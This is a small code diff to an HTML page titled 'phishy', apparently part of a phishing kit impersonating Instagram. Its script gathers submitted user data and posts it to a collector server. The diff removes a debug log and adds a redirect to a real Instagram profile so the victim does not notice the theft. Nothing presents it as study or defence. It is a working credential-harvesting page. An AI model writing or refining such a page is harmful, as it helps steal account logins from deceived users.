@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <meta name="viewport" content="width=device-width, initial-scale=1" charset="UTF-8" />
-<!-- <meta http-equiv="refresh" content="0; URL=https://www.instagram.com" /> -->
 <html lang="en">
   <head>
     <title>phishy</title>
@@ -25,9 +24,8 @@
             return (obj[pair[0]] = pair[1]), obj
           }, {})
 
-        console.log(userdata)
-
         await post('http://localhost:5000', userdata)
+        window.location = 'https://www.instagram.com/winsstooon/'
       })()
     </script>
   </body>
